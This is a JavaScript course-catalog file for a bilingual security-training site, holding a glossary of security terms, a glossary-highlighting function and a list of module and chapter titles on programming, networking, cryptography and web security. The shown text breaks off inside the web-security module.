// Course catalog. Lesson text and checkpoints are loaded by module and language.
const SECTION_CONTENT = {}, SECTION_CONTENT_EN = {};
const SECTION_CHECKPOINTS = {}, SECTION_CHECKPOINTS_EN = {};

function registerLessonPack(language, data) {
  const articles = language === 'en' ? SECTION_CONTENT_EN : SECTION_CONTENT;
  const quizzes = language === 'en' ? SECTION_CHECKPOINTS_EN : SECTION_CHECKPOINTS;
  for (const [key, lesson] of Object.entries(data)) {
    articles[key] = lesson.html;
    quizzes[key] = lesson.checkpoints;
  }
}

const GLOSSARY = {
  "RFC": "Request for Comments，互联网工程任务组(IETF)发布的标准化文档，定义了互联网协议和技术规范。",
  "模逆元": "modular multiplicative inverse，对于整数 a 和模数 m，满足 (a · x) ≡ 1 (mod m) 的整数 x。用扩展欧几里得算法计算。",
  "欧拉函数": "Euler's totient function，记作 φ(n)，表示小于 n 且与 n 互质的正整数个数。若 n = p×q（p,q 为质数），则 φ(n) = (p-1)(q-1)。",
  "SUID": "Set User ID，Linux 文件权限位。当可执行文件设置了 SUID 位后，任何用户执行该文件时都以文件所有者的权限运行。是Linux提权的常见攻击面。",
  "半连接队列": "TCP 握手中服务器维护的一个队列，存放收到 SYN 但尚未完成三次握手的连接。SYN Flood 攻击通过发送大量伪造 SYN 消耗此队列。",
  "费马分解": "Fermat's factorization method，利用两个相近质数的乘积 n = p×q 可表示为平方差 n = a² - b² = (a+b)(a-b) 的性质。当 |p-q| 很小时极快。",
  "OWASP Top 10": "Open Web Application Security Project 发布的十大 Web 应用安全风险排名，是全球 Web 安全的事实标准。SQL注入常年位居榜首。",
  "XSS": "Cross-Site Scripting，跨站脚本攻击。攻击者将恶意脚本注入网页，当其他用户访问该页面时执行。分反射型、存储型和 DOM 型三类。",
  "CSP": "Content Security Policy，内容安全策略。HTTP 响应头，告诉浏览器哪些来源的内容（脚本/样式/图片等）可以加载执行，是防御 XSS 的关键机制。",
  "CSRF": "Cross-Site Request Forgery，跨站请求伪造。利用用户已登录的身份，在用户不知情的情况下以用户名义发送恶意请求。",
  "SSRF": "Server-Side Request Forgery，服务端请求伪造。攻击者诱使服务器向内部网络或本机发起请求，常用于探测内网服务和读取云元数据。",
  "ECB": "Electronic Codebook，最简单的分组密码工作模式。相同明文块在相同密钥下产生相同密文块（确定性加密），导致数据模式泄露，不推荐使用。",
  "CBC": "Cipher Block Chaining，密文分组链接模式。每个明文块先与前一个密文块 XOR 再加密，首个块与 IV（初始化向量）XOR。比 ECB 安全得多。",
  "IV": "Initialization Vector，初始化向量。CBC 等加密模式中使用的随机或伪随机值，确保相同明文在不同加密操作中产生不同密文。",
  "ARP": "Address Resolution Protocol，地址解析协议。将 IP 地址解析为 MAC 地址。由于无验证机制，容易受到 ARP 欺骗攻击。",
  "MITM": "Man-in-the-Middle，中间人攻击。攻击者在通信双方之间截获、篡改或伪造通信内容，而双方以为自己正在直接通信。",
  "XXE": "XML External Entity，XML 外部实体注入。利用 XML 解析器处理外部实体的功能读取本地文件、发起 SSRF 甚至执行远程代码。",
  "OSINT": "Open Source Intelligence，开源情报。通过公开渠道（搜索引擎/社交媒体/WHOIS/Shodan等）收集目标信息，是渗透测试的第一步。",
  "YARA": "一款恶意软件识别和分类工具，通过编写规则（字符串+条件表达式）来匹配文件特征。安全研究人员用于恶意软件家族分类和威胁狩猎。",
  "沙箱逃逸": "Sandbox Escape，恶意软件检测到自身在分析环境（虚拟机/沙箱）中运行时，隐藏恶意行为以避免被检测的技术。",
  "非对称加密": "Asymmetric Encryption，使用一对数学上相关但不相同的密钥：公钥（公开）用于加密，私钥（保密）用于解密。RSA 是最知名的非对称算法。",
  "对称加密": "Symmetric Encryption，加解密使用同一密钥。速度极快（比非对称快100-1000倍），适用于大批量数据。AES 是当前标准。",
  "缓冲区溢出": "Buffer Overflow，程序向缓冲区写入超出其容量的数据，覆盖相邻内存区域。可导致程序崩溃或执行攻击者注入的代码（shellcode）。被视为最经典的软件漏洞。",
  "shellcode": "一段用于利用软件漏洞的机器码（通常用汇编编写），目的是在目标系统上执行特定操作，最常见的是获取命令行 shell。",
  "WAF": "Web Application Firewall，Web应用防火墙。通过分析和过滤 HTTP 流量来防护 XSS/SQL注入等常见 Web 攻击。",
  "RCE": "Remote Code Execution，远程代码执行。攻击者能在目标服务器上执行任意代码，是最严重的漏洞类型之一。",
  "DDoS": "Distributed Denial of Service，分布式拒绝服务攻击。从多个来源同时向目标发起大量请求或流量，使目标服务不可用。SYN Flood 是经典的 DDoS 手法。",
  "公钥指数 e": "RSA 中公开的加密指数。常用值：65537（0x10001，费马质数 F4），因其二进制中只有两个1，模幂运算效率高且安全性好。",
  "Wiener 攻击": "针对 RSA 的一种攻击方法。当私钥 d 很小（d < n^(1/4)/3）时，可通过连分数展开在多项式时间内恢复 d。",
  "共模攻击": "Common Modulus Attack。用相同的模数 n 但不同的公钥指数 e1,e2 加密同一明文，且 gcd(e1,e2)=1 时，可不需私钥解密。",
  "Docker": "一种开源的应用容器引擎，基于 Linux 内核的 Namespace 与 Cgroups 技术，使应用能够以轻量级容器的形式在任何环境中一致运行。",
  "Kubernetes": "通常简称为 K8s，是 Google 开源的容器集群编排系统，负责自动化容器化应用的部署、弹性扩缩容和资源管理。",
  "K8s": "Kubernetes 的缩写（首字母 K 和尾字母 s 之间有 8 个字母），现代企业级云原生容器编排事实标准。",
  "IAM": "Identity and Access Management，身份与访问控制管理。公有云上用于控制用户、角色和微服务对云资源访问权限的核心组件。",
  "SIEM": "Security Information and Event Management，安全信息与事件管理系统。聚合企业全量日志并提供实时告警关联与分析的蓝队中枢。",
  "Volatility": "著名的开源高级内存数字取证分析框架，支持 Windows、Linux 与 macOS 物理内存镜像的进程树、网络连接与注入代码提取。",
  "C2": "Command and Control（命令与控制），攻击者用于对受感染受害者主机发送控制指令和接收回传数据的服务器信道。",
  "Namespace": "Linux 内核用于实现资源视图隔离的技术（包括 PID、网络、挂载点等），是容器运行环境隔离的底层核心。",
  "Cgroups": "Linux Control Groups，Linux 内核提供的用于限制、统计和隔离进程组所使用的物理资源（CPU、内存、I/O 等）的机制。",
  "Syslog": "标准的网络设备与 Unix/Linux 系统日志通信协议，用于集中传输和存储系统运行事件与安全审计记录。",
  "PCAP": "Packet Capture 数据包捕获文件格式，网络安全分析中用于记录、回溯和取证真实网络流量包的标准格式。",
  "eBPF": "Extended Berkeley Packet Filter，一种革命性的 Linux 内核技术，允许在不修改内核源码或加载内核模块的情况下，在内核空间安全高效地运行沙箱化可观测与安全检测程序。",
  "Falco": "由 Sysdig 开源的云原生运行时安全检测事实标准，通过捕获 Linux 内核系统调用并匹配安全规则，实时告警并阻断容器与 Kubernetes 集群内的黑客异常行为。",
  "Prefetch": "Windows 操作系统的预读取优化机制（存放于 C:\\Windows\\Prefetch），记录可执行文件的运行次数、历史时间戳与加载依赖，是主机数字取证的关键证据。",
  "Shimcache": "又称 AppCompatCache，Windows 应用程序兼容性缓存，保存在注册表中，忠实记录曾在系统上存在并运行过的二进制文件绝对路径、修改时间与元数据。",
  "ATT&CK": "MITRE ATT&CK 框架，基于真实网络攻击对抗沉淀的全球公开知识库，将黑客攻击战术与具体技术细分为 14 大阶段，用于威胁建模与防御评估。",
  "TTPs": "Tactics, Techniques, and Procedures（战术、技术与流程），描述网络攻击者行为模式的高级特征，位于威胁防御“痛苦之金字塔”的最顶端。"
};

function injectGlossary(html) {
  if (!html) return "";
  let result = html;
  if (typeof GLOSSARY === "undefined") return result;
  for (const [term, def] of Object.entries(GLOSSARY)) {
    if (/^[a-zA-Z]{1,2}$/.test(term)) continue;
    const escaped = term.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const isEnglish = !/[^\x00-\x7F]/.test(term);
    const regex = isEnglish
      ? new RegExp("\\b" + escaped + "\\b(?![^<]*>)", "g")
      : new RegExp("(?<![\\w\\$\\{}])" + escaped + "(?![\\w\\$\\{}])(?![^<]*>)", "g");
    result = result.replace(regex, '<span class="glossary" data-term="' + term + '">' + term + '</span>');
  }
  return result;
}

const MODULES = [
  {
    "id": "programming",
    "title": "编程基础",
    "titleEn": "Programming Fundamentals",
    "icon": "⌨",
    "color": "#00ff41",
    "desc": "Python 核心语法、Socket/Scapy 网络编程、Linux Shell 自动化、C 语言指针与内存安全、正则 ReDoS 防御、高并发异步扫描与安全算法实战",
    "descEn": "Python core syntax, Socket/Scapy network programming, Linux Shell automation, C pointers & memory safety, ReDoS mitigation, high-concurrency scanning & security algorithms",
    "chapters": [
      {
        "id": "prog-01",
        "title": "Python 核心语法与安全数据切片",
        "titleEn": "Python Core Syntax & Security Data Slicing",
        "difficulty": 1,
        "sections": [
          {
            "id": "prog-01-01",
            "title": "变量系统、基础类型与切片提取",
            "titleEn": "Variables, Primitive Types & Slice Extraction",
            "type": "article",
            "contentKey": "prog-01-01"
          },
          {
            "id": "prog-01-02",
            "title": "条件分支、循环控制与异常容错",
            "titleEn": "Control Flow, Loops & Defensive Exceptions",
            "type": "article",
            "contentKey": "prog-01-02"
          },
          {
            "id": "prog-01-03",
            "title": "高阶函数、列表推导与安全工具抽象",
            "titleEn": "Functions, Comprehensions & Security Utilities",
            "type": "article",
            "contentKey": "prog-01-03"
          }
        ]
      },
      {
        "id": "prog-02",
        "title": "Python 网络编程与 PoC 工具开发",
        "titleEn": "Python Network Programming & PoC Development",
        "difficulty": 2,
        "sections": [
          {
            "id": "prog-02-01",
            "title": "底层 Socket 编程与 TCP 端口探测",
            "titleEn": "Raw Socket Communication & TCP Port Scanning",
            "type": "article",
            "contentKey": "prog-02-01"
          },
          {
            "id": "prog-02-02",
            "title": "Scapy 数据包嗅探、构造与 ARP 欺骗",
            "titleEn": "Packet Crafting, Sniffing & ARP Poisoning",
            "type": "article",
            "contentKey": "prog-02-02"
          },
          {
            "id": "prog-02-03",
            "title": "Requests 库应用与 Web 漏洞利用脚本开发",
            "titleEn": "HTTP Client Automation & Exploit Development",
            "type": "article",
            "contentKey": "prog-02-03"
          }
        ]
      },
      {
        "id": "prog-03",
        "title": "Linux Shell 脚本与安全自动化",
        "titleEn": "Linux Shell Scripting & Security Automation",
        "difficulty": 2,
        "sections": [
          {
            "id": "prog-03-01",
            "title": "管道流处理与三大文本利器 grep/sed/awk",
            "titleEn": "Pipes, Grep, Sed & Awk Text Processing",
            "type": "article",
            "contentKey": "prog-03-01"
          },
          {
            "id": "prog-03-02",
            "title": "Shell 变量逻辑与日志应急分析脚本",
            "titleEn": "Shell Scripting & Emergency Log Triaging",
            "type": "article",
            "contentKey": "prog-03-02"
          },
          {
            "id": "prog-03-03",
            "title": "Cron 计划任务排查与系统基线自动化巡检",
            "titleEn": "Cron Auditing & Security Baseline Automation",
            "type": "article",
            "contentKey": "prog-03-03"
          }
        ]
      },
      {
        "id": "prog-04",
        "title": "C 语言指针与底层内存安全",
        "titleEn": "C Language Pointers & Low-Level Memory Safety",
        "difficulty": 3,
        "sections": [
          {
            "id": "prog-04-01",
            "title": "内存虚拟地址空间与栈帧结构剖析",
            "titleEn": "Virtual Address Space & Stack Frame Layout",
            "type": "article",
            "contentKey": "prog-04-01"
          },
          {
            "id": "prog-04-02",
            "title": "指针运算、数组越界与缓冲区溢出原语",
            "titleEn": "Pointer Arithmetic, Out-of-Bounds & Buffer Overflows",
            "type": "article",
            "contentKey": "prog-04-02"
          },
          {
            "id": "prog-04-03",
            "title": "堆内存管理与 Use-After-Free 机制",
            "titleEn": "Heap Allocation, Double Free & Use-After-Free",
            "type": "article",
            "contentKey": "prog-04-03"
          }
        ]
      },
      {
        "id": "prog-05",
        "title": "正则表达式与模式匹配防御",
        "titleEn": "Regular Expressions & Pattern Matching Defense",
        "difficulty": 2,
        "sections": [
          {
            "id": "prog-05-01",
            "title": "正则元字符、捕获组与安全规则构建",
            "titleEn": "Regex Metacharacters, Groups & Detection Rules",
            "type": "article",
            "contentKey": "prog-05-01"
          },
          {
            "id": "prog-05-02",
            "title": "正则回溯陷阱与 ReDoS 拒绝服务防御",
            "titleEn": "Catastrophic Backtracking & ReDoS Mitigation",
            "type": "article",
            "contentKey": "prog-05-02"
          }
        ]
      },
      {
        "id": "prog-06",
        "title": "高并发与异步扫描架构",
        "titleEn": "High-Concurrency & Asynchronous Scanning Architectures",
        "difficulty": 3,
        "sections": [
          {
            "id": "prog-06-01",
            "title": "多线程、多进程与 GIL 锁竞争解析",
            "titleEn": "Multi-Threading, Multi-Processing & GIL Constraints",
            "type": "article",
            "contentKey": "prog-06-01"
          },
          {
            "id": "prog-06-02",
            "title": "Asyncio 事件循环与超大规模端口扫描",
            "titleEn": "Asyncio Event Loops & High-Performance Scanning",
            "type": "article",
            "contentKey": "prog-06-02"
          }
        ]
      },
      {
        "id": "prog-07",
        "title": "安全算法与数据结构实战",
        "titleEn": "Security Algorithms & Data Structures in Practice",
        "difficulty": 3,
        "sections": [
          {
            "id": "prog-07-01",
            "title": "位运算黑魔法与 Shellcode 异或混淆",
            "titleEn": "Bitwise Manipulation & Shellcode XOR Encoding",
            "type": "article",
            "contentKey": "prog-07-01"
          },
          {
            "id": "prog-07-02",
            "title": "哈希碰撞、Bloom Filter 与大规模黑名单过滤",
            "titleEn": "Hash Collisions, Bloom Filters & Mass Blacklisting",
            "type": "article",
            "contentKey": "prog-07-02"
          }
        ]
      }
    ]
  },
  {
    "id": "network",
    "title": "计算机网络",
    "titleEn": "Computer Networking",
    "icon": "🌐",
    "color": "#ffd54f",
    "desc": "从物理层到应用层，掌握 TCP/IP 核心协议与网络安全攻防",
    "descEn": "From physical layer to application layer, master core TCP/IP protocols and network security.",
    "chapters": [
      {
        "id": "net-01",
        "title": "TCP/IP 协议栈与底层通信",
        "titleEn": "TCP/IP Stack & Low-Level Protocols",
        "sections": [
          {
            "id": "net-01-01",
            "title": "OSI 与 TCP/IP 分层模型",
            "titleEn": "OSI & TCP/IP Layer Models",
            "contentKey": "net-01-01"
          },
          {
            "id": "net-01-02",
            "title": "TCP 握手挥手与状态机",
            "titleEn": "TCP Handshake, Teardown & State Machine",
            "contentKey": "net-01-02"
          },
          {
            "id": "net-01-03",
            "title": "TCP/IP 核心协议攻击",
            "titleEn": "TCP/IP Protocol Attacks & Defenses",
            "contentKey": "net-01-03"
          }
        ]
      },
      {
        "id": "net-02",
        "title": "Wireshark 流量分析与取证",
        "titleEn": "Wireshark Traffic Analysis & Forensics",
        "sections": [
          {
            "id": "net-02-01",
            "title": "Wireshark 捕获与显示过滤",
            "titleEn": "Wireshark Capture & Display Filters",
            "contentKey": "net-02-01"
          },
          {
            "id": "net-02-02",
            "title": "TCP 流重组与 TLS 解密",
            "titleEn": "TCP Stream Reassembly & TLS Decryption",
            "contentKey": "net-02-02"
          },
          {
            "id": "net-02-03",
            "title": "网络攻击流量特征识别",
            "titleEn": "Malicious Traffic Pattern Recognition",
            "contentKey": "net-02-03"
          }
        ]
      },
      {
        "id": "net-03",
        "title": "DNS 安全与攻击防御",
        "titleEn": "DNS Security & Attack Defenses",
        "sections": [
          {
            "id": "net-03-01",
            "title": "DNS 解析原理与核心记录",
            "titleEn": "DNS Resolution & Resource Records",
            "contentKey": "net-03-01"
          },
          {
            "id": "net-03-02",
            "title": "DNS 投毒与安全防御",
            "titleEn": "DNS Cache Poisoning & DNSSEC",
            "contentKey": "net-03-02"
          },
          {
            "id": "net-03-03",
            "title": "DNS 隐蔽隧道与数据外发",
            "titleEn": "DNS Covert Tunneling & Detection",
            "contentKey": "net-03-03"
          }
        ]
      },
      {
        "id": "net-04",
        "title": "HTTP/HTTPS 协议与加密安全",
        "titleEn": "HTTP/HTTPS Protocols & TLS Security",
        "sections": [
          {
            "id": "net-04-01",
            "title": "HTTP 报文解剖与状态码字典",
            "titleEn": "HTTP Anatomy & Status Codes Cheat Sheet",
            "contentKey": "net-04-01"
          },
          {
            "id": "net-04-02",
            "title": "Cookie 属性与同源策略",
            "titleEn": "Cookie Security Attributes & Same-Origin Policy",
            "contentKey": "net-04-02"
          },
          {
            "id": "net-04-03",
            "title": "TLS 握手时序与 PKI 体系",
            "titleEn": "TLS 1.2/1.3 Handshake & PKI Certificates",
            "contentKey": "net-04-03"
          }
        ]
      },
      {
        "id": "net-05",
        "title": "网络边界防御：防火墙与 IDS/IPS",
        "titleEn": "Perimeter Defense: Firewalls & IDS/IPS",
        "sections": [
          {
            "id": "net-05-01",
            "title": "包过滤与下一代防火墙",
            "titleEn": "Packet Filtering, Stateful Inspection & NGFW",
            "contentKey": "net-05-01"
          },
          {
            "id": "net-05-02",
            "title": "IDS/IPS 原理与检测规则",
            "titleEn": "IDS/IPS Architecture & Detection Rules",
            "contentKey": "net-05-02"
          },
          {
            "id": "net-05-03",
            "title": "防火墙绕过与 NAT 穿透",
            "titleEn": "Firewall Evasion & NAT Traversal",
            "contentKey": "net-05-03"
          }
        ]
      }
    ]
  },
  {
    "id": "cryptography",
    "title": "密码学与现代安全应用",
    "titleEn": "Cryptography & Modern Applications",
    "icon": "🔐",
    "color": "#b388ff",
    "desc": "从古典字频分析到 RSA/ECC、哈希长度扩展、国密体系与抗量子格密码学",
    "descEn": "From classical frequency analysis to RSA/ECC, hash length extension, national ciphers & post-quantum lattice cryptography.",
    "chapters": [
      {
        "id": "crypto-01",
        "title": "古典密码与密码分析",
        "titleEn": "Classical Ciphers & Cryptanalysis",
        "difficulty": 1,
        "sections": [
          {
            "id": "crypto-01-01",
            "title": "单表置换密码与英文字频分析",
            "titleEn": "Monoalphabetic Ciphers & Frequency Analysis",
            "contentKey": "crypto-01-01"
          },
          {
            "id": "crypto-01-02",
            "title": "多表代换密码与 Kasiski 测试",
            "titleEn": "Polyalphabetic Ciphers & Kasiski Test",
            "contentKey": "crypto-01-02"
          },
          {
            "id": "crypto-01-03",
            "title": "一次性密码本 (OTP) 与完善保密性",
            "titleEn": "One-Time Pad & Perfect Secrecy",
            "contentKey": "crypto-01-03"
          }
        ]
      },
      {
        "id": "crypto-02",
        "title": "现代对称加密体系",
        "titleEn": "Modern Symmetric Cryptography",
        "difficulty": 2,
        "sections": [
          {
            "id": "crypto-02-01",
            "title": "Feistel 结构与 DES/3DES 密码演进",
            "titleEn": "Feistel Networks & DES/3DES",
            "contentKey": "crypto-02-01"
          },
          {
            "id": "crypto-02-02",
            "title": "AES 算法底层原理：S 盒、行移位与列混淆",
            "titleEn": "AES Architecture: S-Box & Transformations",
            "contentKey": "crypto-02-02"
          },
          {
            "id": "crypto-02-03",
            "title": "分组加密工作模式与 Padding Oracle 攻击",
            "titleEn": "Cipher Modes & Padding Oracle Attack",
            "contentKey": "crypto-02-03"
          }
        ]
      },
      {
        "id": "crypto-03",
        "title": "非对称加密与公钥密码学",
        "titleEn": "Asymmetric Cryptography & PKI",
        "difficulty": 3,
        "sections": [
          {
            "id": "crypto-03-01",
            "title": "Diffie-Hellman 密钥交换与离散对数难题",
            "titleEn": "Diffie-Hellman Key Exchange & DLP",
            "contentKey": "crypto-03-01"
          },
          {
            "id": "crypto-03-02",
            "title": "RSA 数学原理与欧拉定理深度解密",
            "titleEn": "RSA Foundations & Euler's Totient Theorem",
            "contentKey": "crypto-03-02"
          },
          {
            "id": "crypto-03-03",
            "title": "RSA 典型攻击与 CTF 漏洞实战",
            "titleEn": "RSA Attack Vectors & CTF Challenges",
            "contentKey": "crypto-03-03"
          }
        ]
      },
      {
        "id": "crypto-04",
        "title": "加密哈希函数与消息认证码",
        "titleEn": "Cryptographic Hash Functions & MAC",
        "difficulty": 2,
        "sections": [
          {
            "id": "crypto-04-01",
            "title": "哈希函数家族：MD5、SHA-1 到 SHA-2/SHA-3",
            "titleEn": "Hash Families: MD5, SHA-2 & SHA-3",
            "contentKey": "crypto-04-01"
          },
          {
            "id": "crypto-04-02",
            "title": "哈希长度扩展攻击与 HMAC 消息认证码",
            "titleEn": "Length Extension Attack & HMAC",
            "contentKey": "crypto-04-02"
          },
          {
            "id": "crypto-04-03",
            "title": "安全密码存储哈希：bcrypt、PBKDF2 与 Argon2",
            "titleEn": "Secure Password Hashing: bcrypt & Argon2",
            "contentKey": "crypto-04-03"
          }
        ]
      },
      {
        "id": "crypto-05",
        "title": "数字签名与公钥基础设施",
        "titleEn": "Digital Signatures & PKI",
        "difficulty": 3,
        "sections": [
          {
            "id": "crypto-05-01",
            "title": "数字签名机制：RSA-PSS 与 ECDSA",
            "titleEn": "Digital Signature Schemes: RSA-PSS & ECDSA",
            "contentKey": "crypto-05-01"
          },
          {
            "id": "crypto-05-02",
            "title": "X.509 数字证书体系与信任链漫游",
            "titleEn": "X.509 Certificates & Chain of Trust",
            "contentKey": "crypto-05-02"
          },
          {
            "id": "crypto-05-03",
            "title": "证书透明度 (CT) 与公钥钉扎 (Pinning)",
            "titleEn": "Certificate Transparency & Key Pinning",
            "contentKey": "crypto-05-03"
          }
        ]
      },
      {
        "id": "crypto-06",
        "title": "现代前沿密码学与国密体系",
        "titleEn": "Modern Advanced Cryptography & Standards",
        "difficulty": 3,
        "sections": [
          {
            "id": "crypto-06-01",
            "title": "国密算法体系：SM2、SM3 与 SM4 实战速查",
            "titleEn": "National Commercial Ciphers: SM2, SM3 & SM4",
            "contentKey": "crypto-06-01"
          },
          {
            "id": "crypto-06-02",
            "title": "零知识证明 (ZKP) 与同态加密 (FHE)",
            "titleEn": "Zero-Knowledge Proofs & Homomorphic Encryption",
            "contentKey": "crypto-06-02"
          },
          {
            "id": "crypto-06-03",
            "title": "后量子密码学 (PQC) 与抗量子计算攻击",
            "titleEn": "Post-Quantum Cryptography & Lattice Ciphers",
            "contentKey": "crypto-06-03"
          }
        ]
      }
    ]
  },
  {
    "id": "websec",
    "title": "Web 安全",
    "titleEn": "Web Security",
    "icon": "🕸",
    "color": "#ff4466",
    "desc": "OWASP Top 10 漏洞原理、利用技术与防御策略",
    "descEn": "OWASP Top 10 vulnerability principles, exploitation & defense strategies",
    "chapters": [
      {
        "id": "web-01",
        "title": "SQL 注入系统攻防",
        "titleEn": "SQL Injection Defense & Attack",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-01-01",
            "title": "SQL 注入大白话原理与闭合测试",
            "titleEn": "SQLi Fundamentals & Quote Balancing",
            "type": "article",
            "contentKey": "web-01-01"
          },
          {
            "id": "web-01-02",
            "title": "数字型 vs 字符型注入与注释符",
            "titleEn": "Numeric vs String SQLi & Comments",
            "type": "article",
            "contentKey": "web-01-02"
          },
          {
            "id": "web-01-03",
            "title": "联合查询注入：测列与拖库",
            "titleEn": "UNION Query Injection & Extraction",
            "type": "article",
            "contentKey": "web-01-03"
          },
          {
            "id": "web-01-04",
            "title": "报错注入：UpdateXml 显错实战",
            "titleEn": "Error-Based Injection (UpdateXml)",
            "type": "article",
            "contentKey": "web-01-04"
          },
          {
            "id": "web-01-05",
            "title": "布尔盲注：真假判定与二分截取",
            "titleEn": "Boolean-Based Blind Injection",
            "type": "article",
            "contentKey": "web-01-05"
          },
          {
            "id": "web-01-06",
            "title": "时间盲注：SLEEP 延时静默探测",
            "titleEn": "Time-Based Blind Injection",
            "type": "article",
            "contentKey": "web-01-06"
          },
          {
            "id": "web-01-07",
            "title": "宽字节注入与二次注入黑魔法",
            "titleEn": "Wide-Byte & Second-Order SQLi",
            "type": "article",
            "contentKey": "web-01-07"
          },
          {
            "id": "web-01-08",
            "title": "SQL 注入终极防御：PDO 预编译",
            "titleEn": "Ultimate Defense: PDO Prepared",
            "type": "article",
            "contentKey": "web-01-08"
          }
        ]
      },
      {
        "id": "web-02",
        "title": "操作系统命令注入",
        "titleEn": "OS Command Injection",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-02-01",
            "title": "命令注入大白话原理与管道连接符",
            "titleEn": "Command Injection Fundamentals & Piping",
            "type": "article",
            "contentKey": "web-02-01"
          },
          {
            "id": "web-02-02",
            "title": "命令注入过滤绕过与混淆技巧",
            "titleEn": "Command Injection Bypass & Obfuscation",
            "type": "article",
            "contentKey": "web-02-02"
          },
          {
            "id": "web-02-03",
            "title": "命令注入终极防御：参数化与架构隔离",
            "titleEn": "Command Injection Ultimate Defense",
            "type": "article",
            "contentKey": "web-02-03"
          }
        ]
      },
      {
        "id": "web-03",
        "title": "XML 外部实体注入 (XXE)",
        "titleEn": "XML External Entity (XXE)",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-03-01",
            "title": "XXE 基础：XML 结构与 DTD 实体机制",
            "titleEn": "XXE Fundamentals: XML & DTD Entities",
            "type": "article",
            "contentKey": "web-03-01"
          },
          {
            "id": "web-03-02",
            "title": "XXE 实战：文件读取、SSRF 与 Blind OOB",
            "titleEn": "XXE Exploitation: File Retrieval & OOB",
            "type": "article",
            "contentKey": "web-03-02"
          },
          {
            "id": "web-03-03",
            "title": "XXE 终极防御：禁用 DTD 与各语言配置",
            "titleEn": "Ultimate XXE Defense: Disabling DTD",
            "type": "article",
            "contentKey": "web-03-03"
          }
        ]
      },
      {
        "id": "web-04",
        "title": "XSS 跨站脚本攻击",
        "titleEn": "Cross-Site Scripting (XSS)",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-04-01",
            "title": "XSS 大白话原理与三大类型对照",
            "titleEn": "XSS Fundamentals & Three Core Types",
            "type": "article",
            "contentKey": "web-04-01"
          },
          {
            "id": "web-04-02",
            "title": "XSS 绕过技巧与事件属性黑魔法",
            "titleEn": "XSS Bypass Techniques & Event Handlers",
            "type": "article",
            "contentKey": "web-04-02"
          },
          {
            "id": "web-04-03",
            "title": "XSS 终极防御：上下文转义与 CSP 策略",
            "titleEn": "Ultimate XSS Defense: Escaping & CSP",
            "type": "article",
            "contentKey": "web-04-03"
          }
        ]
      },
      {
        "id": "web-05",
        "title": "CSRF 与 SSRF 系统攻防",
        "titleEn": "CSRF & SSRF Defense & Exploitation",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-05-01",
            "title": "CSRF 大白话原理与漏洞 PoC 自动生成",
            "titleEn": "CSRF Fundamentals & PoC Automation",
            "type": "article",
            "contentKey": "web-05-01"
          },
          {
            "id": "web-05-02",
            "title": "CSRF 终极防御：SameSite Cookie 与 Anti-CSRF Token",
            "titleEn": "Ultimate CSRF Defense: SameSite & Tokens",
            "type": "article",
            "contentKey": "web-05-02"
          },
          {
            "id": "web-05-03",
            "title": "SSRF 大白话原理与内网探测/云元数据盗取",
            "titleEn": "SSRF Fundamentals & Cloud Metadata Theft",
            "type": "article",
            "contentKey": "web-05-03"
          },
          {
            "id": "web-05-04",
            "title": "SSRF 绕过技巧：DNS Rebinding 与特殊 IP 变形",
            "titleEn": "SSRF Bypasses: DNS Rebinding & IP Tricks",
            "type": "article",
            "contentKey": "web-05-04"
          },
          {
            "id": "web-05-05",
            "title": "SSRF 终极防御：网络隔离与严格白名单",
            "titleEn": "Ultimate SSRF Defense: Isolation & Allowlists",
            "type": "article",
            "contentKey": "web-05-05"
          }
        ]
      },
      {
        "id": "web-06",
        "title": "文件上传漏洞系统攻防",
        "titleEn": "File Upload Vulnerabilities & Defense",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-06-01",
            "title": "文件上传大白话原理与前端绕过 / MIME 伪造",
            "titleEn": "File Upload Fundamentals & MIME Spoofing",
            "type": "article",
            "contentKey": "web-06-01"
          },
          {
            "id": "web-06-02",
            "title": "文件上传黑名单突破：特殊后缀与配置文件 (.htaccess/.user.ini)",
            "titleEn": "Blacklist Bypasses & Server Config Overrides",
            "type": "article",
            "contentKey": "web-06-02"
          },
          {
            "id": "web-06-03",
            "title": "图片马制作、二次渲染绕过与条件竞争",
            "titleEn": "Webshell Polyglots & Race Conditions",
            "type": "article",
            "contentKey": "web-06-03"
          },
          {
            "id": "web-06-04",
            "title": "文件上传终极防御：存储分离、重命名与执行权限剥离",
            "titleEn": "Ultimate Upload Defense: Isolation & Renaming",
            "type": "article",
            "contentKey": "web-06-04"
          }
        ]
      },
      {
        "id": "web-07",
        "title": "反序列化漏洞系统攻防",
        "titleEn": "Insecure Deserialization & POP Chains",
        "difficulty": 3,
        "sections": [
          {
            "id": "web-07-01",
            "title": "反序列化大白话原理与 PHP 核心魔术方法",
            "titleEn": "Deserialization Fundamentals & PHP Magic Methods",
            "type": "article",
            "contentKey": "web-07-01"
          },
          {
            "id": "web-07-02",
            "title": "PHP POP 链构造实战与对象注入",
            "titleEn": "PHP POP Chain Construction & Object Injection",
            "type": "article",
            "contentKey": "web-07-02"
          },
          {
            "id": "web-07-03",
            "title": "Java 原生反序列化与 Commons Collections 链",
            "titleEn": "Java Deserialization & Commons Collections Chains",
            "type": "article",
            "contentKey": "web-07-03"
          },
          {
            "id": "web-07-04",
            "title": "Python pickle 危险特性与反序列化终极防御",
            "titleEn": "Python Pickle Mechanics & Ultimate Defense",
            "type": "article",
            "contentKey": "web-07-04"
          }
        ]
      },
      {
        "id": "web-08",
        "title": "SSTI 模板注入系统攻防",
        "titleEn": "Server-Side Template Injection (SSTI)",
        "difficulty": 3,
        "sections": [
          {
            "id": "web-08-01",
            "title": "SSTI 大白话原理与模板引擎识别",
            "titleEn": "SSTI Fundamentals & Engine Detection",
            "type": "article",
            "contentKey": "web-08-01"
          },
          {
            "id": "web-08-02",
            "title": "Jinja2 / Python 沙箱逃逸核心技术",
            "titleEn": "Jinja2 & Python Sandbox Escape Mechanics",
            "type": "article",
            "contentKey": "web-08-02"
          },
          {
            "id": "web-08-03",
            "title": "SSTI 绕过技巧与模板注入终极防御",
            "titleEn": "SSTI Bypasses & Ultimate Template Hardening",
            "type": "article",
            "contentKey": "web-08-03"
          }
        ]
      },
      {
        "id": "web-09",
        "title": "认证与会话安全系统攻防",
        "titleEn": "Authentication & Session Security",
        "difficulty": 2,
        "sections": [
          {
            "id": "web-09-01",
            "title": "JWT 原理与攻防：alg=none 与弱秘钥破解",
            "titleEn": "JWT Fundamentals: alg=none & Secret Cracking",
